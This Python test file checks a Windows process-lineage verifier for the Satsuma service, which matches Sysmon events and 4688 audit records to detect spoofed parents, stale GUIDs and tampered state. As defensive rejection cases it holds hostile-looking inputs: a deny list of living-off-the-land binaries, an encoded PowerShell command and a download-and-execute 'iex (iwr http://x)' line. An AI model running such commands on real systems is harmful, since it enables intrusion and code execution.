"""Satsuma's own launches confirmed by Sysmon GUIDs, approved digests and Windows' 4688 (owner's rule 2026-11-25)."""
import json

from satsuma_win import lineage
from tests.test_windows_upgrade import _Key

PF = 'C:\\Program Files\\Satsuma\\'
SVC = PF + 'satsuma-core-windows.exe'
PANEL = PF + 'satsuma-panel.exe'
GOOD, BAD = 'a' * 64, 'b' * 64
T0 = '2026-11-24 21:40:33.100'
T1 = '2026-11-24 21:40:33.200'


def create(guid, pid, image, parent, ppid, sha=None, at=T0):
    return {'id': 1, 'ProcessGuid': guid, 'ProcessId': str(pid), 'Image': image, 'ParentProcessGuid': parent,
            'ParentProcessId': str(ppid), 'Hashes': 'SHA256=' + (sha or 'c' * 64).upper(), 'UtcTime': at}


def access(src_guid, src_pid, tgt_guid, tgt_pid, src_image=SVC, tgt_image='C:\\Windows\\System32\\ARP.EXE', at=T1):
    return {'id': 10, 'GrantedAccess': '0x1fffff', 'SourceProcessGUID': src_guid, 'SourceProcessId': str(src_pid),
            'SourceImage': src_image, 'TargetProcessGUID': tgt_guid, 'TargetProcessId': str(tgt_pid),
            'TargetImage': tgt_image, 'UtcTime': at}


def windows(records):
    return lambda pid: records.get(pid)


def make(tmp_path, os_records, service=4800, own=4800, parent=700, disk=None, approved=(GOOD,), key=None):
    return lineage.Lineage(tmp_path, key or _Key(), approved=lambda: set(approved),
                           installed=lambda: disk if disk is not None else {SVC.lower(): GOOD, PANEL.lower(): GOOD},
                           service_pid=lambda: service, os_log=windows(os_records), own_pid=own, parent_pid=parent)


def test_service_tool_confirmed_when_sysmon_and_windows_agree(tmp_path):
    lin = make(tmp_path, {5912: {'image': 'C:\\Windows\\System32\\ARP.EXE', 'creator_pid': 4800}})
    lin.note(create('{arp}', 5912, 'C:\\Windows\\System32\\ARP.EXE', '{svc}', 4800))
    assert lin.decide(access('{svc}', 4800, '{arp}', 5912)) is None


def test_parent_spoof_is_caught(tmp_path):
    # The creation record claims explorer as parent; the real creator (the access source) is the service.
    lin = make(tmp_path, {5912: {'image': 'C:\\Windows\\System32\\ARP.EXE', 'creator_pid': 4800}})
    clock = [0.0]
    lin.clock = lambda: clock[0]
    lin.note(create('{arp}', 5912, 'C:\\Windows\\System32\\ARP.EXE', '{explorer}', 6792))
    # It waits for a launch of the same id by the source (a stale GUID, CI 2026-11-25); none comes: critical.
    assert lin.decide(access('{svc}', 4800, '{arp}', 5912)) == 'wait'
    clock[0] = lineage.WAIT + 1
    assert 'sahtelemesi' in lin.due()[0][1]


def test_stale_source_guid_with_the_sources_parent_id_is_not_a_spoof(tmp_path):
    # CI 2026-11-25: the access names the service by a stale GUID; the creation names it by its id.
    # 2026-11-26: on this weak path Windows' 4688 must also name the creator program (Satsuma's exe).
    lin = make(tmp_path, {5912: {'image': 'C:\\Windows\\System32\\ARP.EXE', 'creator_pid': 4800, 'creator_image': SVC}})
    lin.note(create('{arp}', 5912, 'C:\\Windows\\System32\\ARP.EXE', '{svc-real}', 4800))
    assert lin.decide(access('{svc-stale}', 4800, '{arp}', 5912)) is None


def test_stale_guid_of_another_parents_launch_is_not_a_spoof(tmp_path):
    # CI 2026-11-25: the GUID names route.exe started by the test script; the service's own route.exe has the
    # same id, program and moment. Bayat kimlik başkasının route.exe'sini gösterir; Satsuma'nınki bulunur.
    route = 'C:\\Windows\\System32\\ROUTE.EXE'
    lin = make(tmp_path, {5912: {'image': route, 'creator_pid': 4800}})
    lin.note(create('{other}', 5912, route, '{pwsh}', 6000, at='2026-11-24 21:40:30.000'))
    lin.note(create('{mine}', 5912, route, '{svc}', 4800))
    assert lin.decide(access('{svc}', 4800, '{other}', 5912, tgt_image=route)) is None


def test_windows_4688_must_agree(tmp_path):
    clock = [0.0]
    lin = make(tmp_path, {})
    lin.clock = lambda: clock[0]
    lin.note(create('{arp}', 5912, 'C:\\Windows\\System32\\ARP.EXE', '{svc}', 4800))
    # Windows writes 4688 a moment later: the access waits, then without it is critical.
    assert lin.decide(access('{svc}', 4800, '{arp}', 5912)) == 'wait'
    clock[0] = lineage.WAIT + 1
    assert '4688' in lin.due()[0][1]
    # The same process id reused: an older 4688 of another program is not this creation.
    created = lineage.utc(T0)
    lin.os_log = windows({5912: [{'image': 'C:\\Users\\x\\old.exe', 'creator_pid': 4800, 'at': created - 200}]})
    assert lin.decide(access('{svc}', 4800, '{arp}', 5912)) == 'wait'
    lin.os_log = windows({5912: [{'image': 'C:\\Users\\x\\old.exe', 'creator_pid': 4800, 'at': created - 200},
                                 {'image': 'C:\\Windows\\System32\\ARP.EXE', 'creator_pid': 4800, 'at': created + 0.2}][::-1]})
    assert lin.decide(access('{svc}', 4800, '{arp}', 5912)) is None
    lin.os_log = windows({5912: {'image': 'C:\\Users\\x\\evil.exe', 'creator_pid': 4800}})
    assert 'farklı program' in lin.decide(access('{svc}', 4800, '{arp}', 5912))
    lin.os_log = windows({5912: {'image': 'C:\\Windows\\System32\\ARP.EXE', 'creator_pid': 1234}})
    assert 'başka bir başlatan' in lin.decide(access('{svc}', 4800, '{arp}', 5912))
    lin.os_log = lambda pid: (_ for _ in ()).throw(OSError('denied'))
    assert 'okunamadı' in lin.decide(access('{svc}', 4800, '{arp}', 5912))


def test_target_outside_tool_folders_is_critical(tmp_path):
    lin = make(tmp_path, {5912: {'image': 'C:\\Users\\Public\\x.exe', 'creator_pid': 4800}})
    lin.note(create('{x}', 5912, 'C:\\Users\\Public\\x.exe', '{svc}', 4800))
    assert 'klasörlerinde değil' in lin.decide(access('{svc}', 4800, '{x}', 5912, tgt_image='C:\\Users\\Public\\x.exe'))


def test_source_not_confirmed_by_the_service_manager_is_critical(tmp_path):
    lin = make(tmp_path, {}, service=None)
    assert 'doğrulayamadı' in lin.decide(access('{svc}', 4800, '{arp}', 5912))
    lin = make(tmp_path, {}, service=9999)
    assert 'bu süreç değil' in lin.decide(access('{svc}', 4800, '{arp}', 5912))
    assert 'doğrulanmış bir Satsuma' in make(tmp_path, {}).decide(access('{other}', 3000, '{arp}', 5912))


def test_panel_unpacker_confirmed_only_for_the_approved_file_on_disk(tmp_path):
    recs = {5008: {'image': PANEL, 'creator_pid': 7728}}
    lin = make(tmp_path, recs)
    lin.note(create('{p1}', 7728, PANEL, '{explorer}', 6792, sha=GOOD))
    lin.note(create('{p2}', 5008, PANEL, '{p1}', 7728, sha=GOOD))
    assert lin.decide(access('{p1}', 7728, '{p2}', 5008, src_image=PANEL, tgt_image=PANEL)) is None
    # A panel exe whose digest is not in the signed record, or differs from the file on disk: critical.
    lin = make(tmp_path, recs, approved=(BAD,))
    lin.note(create('{p1}', 7728, PANEL, '{explorer}', 6792, sha=GOOD))
    lin.note(create('{p2}', 5008, PANEL, '{p1}', 7728, sha=GOOD))
    assert 'doğrulanmış bir Satsuma' in lin.decide(access('{p1}', 7728, '{p2}', 5008, src_image=PANEL, tgt_image=PANEL))
    lin = make(tmp_path, recs, disk={PANEL.lower(): BAD})
    lin.note(create('{p1}', 7728, PANEL, '{explorer}', 6792, sha=GOOD))
    assert 'doğrulanmış bir Satsuma' in lin.decide(access('{p1}', 7728, '{p2}', 5008, src_image=PANEL, tgt_image=PANEL))


def test_service_unpacker_and_the_previous_instance_after_a_restart(tmp_path):
    key = _Key()
    recs = {3788: {'image': SVC, 'creator_pid': 7088}, 4420: {'image': 'C:\\Windows\\System32\\ARP.EXE', 'creator_pid': 3788}}
    lin = make(tmp_path, recs, service=7088, own=3788, parent=7088, key=key)
    lin.note(create('{boot}', 7088, SVC, '{services}', 650, sha=GOOD))
    lin.note(create('{py}', 3788, SVC, '{boot}', 7088, sha=GOOD))
    assert lin.decide(access('{boot}', 7088, '{py}', 3788, src_image=SVC, tgt_image=SVC)) is None
    assert {'{boot}', '{py}'} <= set(lin.known)
    # The next instance reads the signed list and confirms the old instance's last tools.
    nxt = make(tmp_path, recs, service=9100, own=9200, parent=9100, key=key)
    nxt.note(create('{arp}', 4420, 'C:\\Windows\\System32\\ARP.EXE', '{py}', 3788))
    assert nxt.decide(access('{py}', 3788, '{arp}', 4420)) is None


def test_a_list_changed_by_hand_is_not_trusted(tmp_path):
    key = _Key()
    lin = make(tmp_path, {}, key=key)
    lin.known['{svc}'] = {'pid': 4800, 'at': 0}
    lin._save()
    body = json.loads((tmp_path / lineage.STATE).read_text(encoding='utf-8'))
    body['body']['known']['{evil}'] = {'pid': 1, 'at': 0}
    (tmp_path / lineage.STATE).write_text(json.dumps(body), encoding='utf-8')
    assert '{evil}' not in make(tmp_path, {}, key=key).known


def test_an_access_waits_for_its_target_then_is_decided(tmp_path):
    clock = [0.0]
    lin = make(tmp_path, {5912: {'image': 'C:\\Windows\\System32\\ARP.EXE', 'creator_pid': 4800}})
    lin.clock = lambda: clock[0]
    event = access('{svc}', 4800, '{arp}', 5912)
    assert lin.decide(event) == 'wait' and lin.due() == []
    lin.note(create('{arp}', 5912, 'C:\\Windows\\System32\\ARP.EXE', '{svc}', 4800))
    assert lin.due() == [(event, None)]
    lin.decide(access('{svc}', 4800, '{ghost}', 1))
    clock[0] = lineage.WAIT + 1
    assert 'bulunamadı' in lin.due()[0][1]


def test_late_access_is_not_a_launch(tmp_path):
    lin = make(tmp_path, {5912: {'image': 'C:\\Windows\\System32\\ARP.EXE', 'creator_pid': 4800}})
    lin.note(create('{arp}', 5912, 'C:\\Windows\\System32\\ARP.EXE', '{svc}', 4800))
    clock = [0.0]
    lin.clock = lambda: clock[0]
    # No creation matches the moment of the access: it waits, then stays critical.
    assert lin.decide(access('{svc}', 4800, '{arp}', 5912, at='2026-11-24 21:45:00.000')) == 'wait'
    clock[0] = lineage.WAIT + 1
    assert 'bulunamadı' in lin.due()[0][1]


def test_process_audit_is_enabled_by_guid():
    calls = []

    class R:
        def __init__(self, out):
            self.returncode, self.stdout = 0, out

    def runner(argv, **kw):
        calls.append(argv)
        return R('Machine Name,Policy Target,Subcategory,Subcategory GUID,Inclusion Setting\nX,System,Process Creation,{0CCE922B-69AE-11D9-BED3-505054503030},Success')
    result = lineage.enable_process_audit(runner)
    assert result['ok'] and calls[0][1:] == ['/set', '/subcategory:' + lineage.AUDIT_PROCESS_CREATION, '/success:enable']


def test_a_stale_guid_from_a_reused_process_id_is_not_trusted(tmp_path):
    # Owner's machine 2026-11-25: Sysmon wrote the GUID of a finished SearchProtocolHost (PID 9180) in the
    # access record of Satsuma's route.exe that got PID 9180 next.
    recs = {9180: [{'image': 'C:\\Windows\\System32\\route.exe', 'creator_pid': 4800, 'at': lineage.utc(T0)}]}
    lin = make(tmp_path, recs)
    lin.note(create('{search}', 9180, 'C:\\Windows\\System32\\SearchProtocolHost.exe', '{indexer}', 8288,
                    at='2026-11-24 21:32:47.353'))
    lin.note(create('{route}', 9180, 'C:\\Windows\\System32\\route.exe', '{svc}', 4800))
    stale = access('{svc}', 4800, '{search}', 9180, tgt_image='C:\\Windows\\System32\\route.exe')
    assert lin.decide(stale) is None
    # Without Satsuma's own creation of that route.exe, the stale record stays critical.
    lin2 = make(tmp_path, recs)
    lin2.note(create('{search}', 9180, 'C:\\Windows\\System32\\SearchProtocolHost.exe', '{indexer}', 8288,
                     at='2026-11-24 21:32:47.353'))
    assert lin2.decide(stale) == 'wait'


def test_a_stale_guid_of_an_earlier_process_of_the_same_program_is_not_trusted(tmp_path):
    recs = {9180: [{'image': 'C:\\Windows\\System32\\route.exe', 'creator_pid': 4800, 'at': lineage.utc(T0)}]}
    lin = make(tmp_path, recs)
    lin.note(create('{old}', 9180, 'C:\\Windows\\System32\\route.exe', '{svc}', 4800, at='2026-11-24 21:30:00.000'))
    lin.note(create('{new}', 9180, 'C:\\Windows\\System32\\route.exe', '{svc}', 4800))
    assert lin.decide(access('{svc}', 4800, '{old}', 9180, tgt_image='C:\\Windows\\System32\\route.exe')) is None


def test_satsumas_own_memory_read_of_lsass_is_accepted_and_others_are_not(tmp_path):
    lin = make(tmp_path, {})
    read = dict(access('{svc}', 4800, '{lsass}', 700, tgt_image='C:\\Windows\\System32\\lsass.exe'), GrantedAccess='0x1010')
    assert lin.decide(read) is None
    assert lin.decide(dict(read, GrantedAccess='0x101c11')) is None
    assert lin.decide(dict(read, GrantedAccess='0x1438')) == 'tam erişim dışında bir istek'


ARP = 'C:\\Windows\\System32\\ARP.EXE'
PSH = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'
PSH_LINE = 'powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "Get-NetNeighbor"'


def test_stale_source_path_without_the_creator_program_in_4688_is_critical(tmp_path):
    # Process ids alone (stale source GUID) are not enough: 4688 must name Satsuma's exe as the creator.
    lin = make(tmp_path, {5912: {'image': ARP, 'creator_pid': 4800}})
    lin.note(create('{arp}', 5912, ARP, '{svc-real}', 4800))
    clock = [0.0]
    lin.clock = lambda: clock[0]
    assert lin.decide(access('{svc-stale}', 4800, '{arp}', 5912)) == 'bayat kimlikte Windows başlatan Satsuma programını doğrulamadı'


def test_4688_naming_another_creator_program_is_critical(tmp_path):
    lin = make(tmp_path, {5912: {'image': ARP, 'creator_pid': 4800, 'creator_image': 'C:\\Users\\ali\\evil.exe'}})
    lin.note(create('{arp}', 5912, ARP, '{svc}', 4800))
    assert 'başka bir başlatan program' in lin.decide(access('{svc}', 4800, '{arp}', 5912))


def test_a_known_instance_is_checked_again_and_dropped_when_its_exe_changes(tmp_path):
    disk = {SVC.lower(): GOOD}
    lin = make(tmp_path, {5912: {'image': ARP, 'creator_pid': 4800}}, disk=disk)
    lin.note(create('{arp}', 5912, ARP, '{svc}', 4800))
    assert lin.decide(access('{svc}', 4800, '{arp}', 5912)) is None and '{svc}' in lin.known
    disk[SVC.lower()] = BAD          # the file on disk was replaced afterwards
    lin.note(create('{arp2}', 5913, ARP, '{svc}', 4800))
    assert lin.decide(access('{svc}', 4800, '{arp2}', 5913)) is not None
    assert '{svc}' not in lin.known


def test_process_id_alone_does_not_confirm_a_source_that_is_not_an_approved_satsuma_exe(tmp_path):
    lin = make(tmp_path, {5912: {'image': ARP, 'creator_pid': 4800}})
    lin.note(create('{arp}', 5912, ARP, '{evil}', 4800))
    event = access('{evil}', 4800, '{arp}', 5912, src_image='C:\\Users\\ali\\AppData\\Local\\Temp\\evil.exe')
    assert 'onaylı bir Satsuma exe' in lin.decide(event)


def test_an_event_older_than_this_process_is_not_confirmed_by_its_id(tmp_path):
    lin = make(tmp_path, {5912: {'image': ARP, 'creator_pid': 4800}})
    lin.started = lineage.utc(T1) + 60      # this process started a minute after the event
    lin.note(create('{arp}', 5912, ARP, '{svc}', 4800))
    assert 'başlamasından önce' in lin.decide(access('{svc}', 4800, '{arp}', 5912))


def test_system32_is_no_longer_exempt_as_a_whole():
    assert lineage.allowed_target(ARP)
    for tool in ('cmd.exe', 'wscript.exe', 'mshta.exe', 'rundll32.exe', 'certutil.exe', 'bitsadmin.exe', 'schtasks.exe'):
        assert not lineage.allowed_target('C:\\Windows\\System32\\' + tool), tool


def test_powershell_is_accepted_only_with_satsumas_own_command_line():
    assert lineage.allowed_target(PSH, PSH_LINE)
    assert not lineage.allowed_target(PSH)                                   # unknown command line
    assert not lineage.allowed_target(PSH, 'powershell.exe -enc SQBFAFgA')
    assert not lineage.allowed_target(PSH, 'powershell.exe -NoProfile -Command "iex (iwr http://x)"')
    assert not lineage.allowed_target(PSH, PSH_LINE + ' -EncodedCommand SQBFAFgA')
